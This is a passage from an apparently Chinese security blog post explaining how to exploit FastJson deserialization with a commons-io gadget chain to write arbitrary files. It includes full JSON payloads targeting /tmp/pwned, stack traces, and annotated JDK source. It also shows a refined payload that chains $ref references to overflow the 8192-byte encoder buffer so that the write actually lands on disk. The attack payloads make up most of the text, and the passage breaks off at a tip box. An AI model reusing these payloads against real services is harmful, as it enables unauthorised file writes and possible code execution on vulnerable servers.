<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: create instance error, null, public org.apache.commons.io.output.WriterOutputStream(java.io.Writer,java.nio.charset.Charset,int,boolean)</span><br></pre></td></tr></table></figure></div>

<p>或者 <code>checkAutoType</code> 的 <code>expectClass</code> 为 <code>null</code> 导致检查不通过：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: autoType is not support. org.apache.commons.io.output.WriterOutputStream</span><br></pre></td></tr></table></figure></div>

<p>实测下面这个格式的 payload 成功率会高一些，原因不明。</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;charSequence&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;&lt;&lt;&lt;你的字符串&gt;&gt;&gt;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span><span class="number">1024</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp/pwned&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;writeImmediately&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p>尝试用 FastJson 进行解析执行，发现文件创建了，也确实执行到了 <code>FileWriterWithEncoding.write(char[], int, int)</code> 方法，但是文件内容是空的？</p>
<p>这里涉及到的一个问题就是：对于 <code>OutputStreamWriter</code> 对象，当要写入的字符串长度不够时，输出的内容会被保留在 <code>ByteBuffer</code> 中，不会被实际输出到文件里。</p>
<p>具体来说有如下调用栈：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">at sun.nio.cs.StreamEncoder.implWrite(StreamEncoder.java:265)</span><br><span class="line">at sun.nio.cs.StreamEncoder.write(StreamEncoder.java:125)</span><br><span class="line">at java.io.OutputStreamWriter.write(OutputStreamWriter.java:207)</span><br><span class="line">at org.apache.commons.io.output.FileWriterWithEncoding.write(FileWriterWithEncoding.java:288)</span><br><span class="line">at org.apache.commons.io.output.WriterOutputStream.flushOutput(WriterOutputStream.java:308)</span><br><span class="line">at org.apache.commons.io.output.WriterOutputStream.write(WriterOutputStream.java:224)</span><br><span class="line">at org.apache.commons.io.input.TeeInputStream.read(TeeInputStream.java:131)</span><br><span class="line">at java.io.BufferedInputStream.fill(BufferedInputStream.java:246)</span><br><span class="line">at java.io.BufferedInputStream.read(BufferedInputStream.java:265)</span><br><span class="line">at org.apache.commons.io.input.BOMInputStream.getBOM(BOMInputStream.java:224)</span><br><span class="line">at org.apache.commons.io.input.BOMInputStream.getBOMCharsetName(BOMInputStream.java:254)</span><br><span class="line">at org.apache.commons.io.input.XmlStreamReader.doHttpStream(XmlStreamReader.java:452)</span><br><span class="line">at org.apache.commons.io.input.XmlStreamReader.&lt;init&gt;(XmlStreamReader.java:339)</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>sun.nio.cs.StreamEncoder#implWrite</code> 函数会调用 <code>java.nio.charset.CoderResult#isOverflow</code> 判断当前字节缓冲区 <code>bb</code> 空间是否已满，如果缓冲区已满则会触发写入操作。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将给定的字符数组片段编码到内部字节缓冲区（bb）中，</span></span><br><span class="line"><span class="comment"> * 必要时把缓冲区写出到底层 OutputStream（通过 writeBytes()）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 关键点：</span></span><br><span class="line"><span class="comment"> * - 使用 CharsetEncoder（encoder）把字符转成字节；</span></span><br><span class="line"><span class="comment"> * - 处理 UTF-16 代理对跨调用分割的情况（haveLeftoverChar/leftoverChar）；</span></span><br><span class="line"><span class="comment"> * - endOfInput=false：表示后面还可能有更多字符会到来（不是最终输入）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">implWrite</span><span class="params">(<span class="type">char</span> cbuf[], <span class="type">int</span> off, <span class="type">int</span> len)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 把 cbuf[off .. off+len) 包装为只读的 CharBuffer，避免拷贝</span></span><br><span class="line">    <span class="type">CharBuffer</span> <span class="variable">cb</span> <span class="operator">=</span> CharBuffer.wrap(cbuf, off, len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果上一次写入时结尾留有一个“残余字符”（通常是高位代理，高代码点的一半），</span></span><br><span class="line">    <span class="comment">// 尝试与本次缓冲区开头的字符合并编码。第二个参数 false 表示“不是最后一次输入”。</span></span><br><span class="line">    <span class="keyword">if</span> (haveLeftoverChar)</span><br><span class="line">        flushLeftoverChar(cb, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 主循环：只要还有待编码的字符就持续编码</span></span><br><span class="line">    <span class="keyword">while</span> (cb.hasRemaining()) &#123;</span><br><span class="line">        <span class="comment">// 调用编码器：把字符从 cb 编到字节缓冲 bb 中；endOfInput=false</span></span><br><span class="line">        <span class="type">CoderResult</span> <span class="variable">cr</span> <span class="operator">=</span> encoder.encode(cb, bb, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cr.isUnderflow()) &#123;</span><br><span class="line">            <span class="comment">// Underflow：编码器认为“当前可用的输入不足以继续编码”</span></span><br><span class="line">            <span class="comment">// 这里断言此时剩余字符数量 &lt;= 1（大多是 0 或 1 个高位代理）</span></span><br><span class="line">            <span class="keyword">assert</span> (cb.remaining() &lt;= <span class="number">1</span>) : cb.remaining();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cb.remaining() == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="comment">// 若刚好还剩 1 个字符，把它暂存为“残余字符”，</span></span><br><span class="line">                <span class="comment">// 等下一次 write 传入更多字符时再尝试与其配对（处理代理对跨边界）</span></span><br><span class="line">                haveLeftoverChar = <span class="literal">true</span>;</span><br><span class="line">                leftoverChar = cb.get();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 本次写入结束（要么已全部编码，要么留 1 个等待下次）</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cr.isOverflow()) &#123;</span><br><span class="line">            <span class="comment">// ✅ Overflow：字节缓冲区 bb 空间已满，必须先把已编码的字节写到底层流</span></span><br><span class="line">            <span class="keyword">assert</span> bb.position() &gt; <span class="number">0</span>;</span><br><span class="line">            writeBytes();  <span class="comment">// 把 bb 中的字节写出并清空/复位</span></span><br><span class="line">            <span class="keyword">continue</span>;      <span class="comment">// 继续尝试编码剩余字符</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 走到这里说明编码发生了错误（既不是 underflow 也不是 overflow），</span></span><br><span class="line">        <span class="comment">// 例如：MalformedInputException（畸形输入，如单独的低位代理）</span></span><br><span class="line">        <span class="comment">//      或 UnmappableCharacterException（目标编码不可表示的字符）。</span></span><br><span class="line">        cr.throwException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>问题搞清楚了，我们需要写入足够长的字符串才会让它刷新 <code>buffer</code>，写入字节到输出流对应的文件里。那么很自然地想到，在 <code>charSequence</code> 处构造超长字符串是不是就可以了？</p>
<p>可惜并非如此，原因是 <code>InputStream buffer</code> 的长度大小在这里已经是固定的 4096 了：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">BUFFER_SIZE</span> <span class="operator">=</span> <span class="number">4096</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">XmlStreamReader</span><span class="params">(<span class="keyword">final</span> InputStream is, <span class="keyword">final</span> String httpContentType,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> <span class="type">boolean</span> lenient, <span class="keyword">final</span> String defaultEncoding)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">BOMInputStream</span> <span class="variable">bom</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BOMInputStream</span>(<span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(is, BUFFER_SIZE), <span class="literal">false</span>, BOMS);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>也就是说每次读取或者写入的字节数最多也就是 4096，但 <code>Writer buffer</code> 大小默认是 8192：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">DEFAULT_BYTE_BUFFER_SIZE</span> <span class="operator">=</span> <span class="number">8192</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="title function_">StreamEncoder</span><span class="params">(OutputStream out, Object lock, CharsetEncoder enc)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(lock);</span><br><span class="line">    <span class="built_in">this</span>.out = out;</span><br><span class="line">    <span class="built_in">this</span>.ch = <span class="literal">null</span>;</span><br><span class="line">    <span class="built_in">this</span>.cs = enc.charset();</span><br><span class="line">    <span class="built_in">this</span>.encoder = enc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ch == <span class="literal">null</span>) &#123;</span><br><span class="line">        bb = ByteBuffer.allocate(DEFAULT_BYTE_BUFFER_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此仅仅一次写入在没有手动执行 flush 的情况下是无法触发实际的字节写入的。</p>
<p>解决方法是通过 <code>$ref</code> 循环引用，多次往同一个 <code>OutputStream</code> 流里输出即可。一次不够 overflow 就多写几次，直到 overflow 为止，就能触发实际的文件写入操作。</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;charSequence&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.String&quot;</span> <span class="string">&quot;aaaaaa...(长度要大于8192，实际写入前8192个字符)&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp/pwned&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;writeImmediately&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;trigger1&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.input&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.branch&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;trigger2&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.input&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.branch&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;trigger3&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.input&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.branch&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>实际写成下面这种形式成功率高一些：</p>
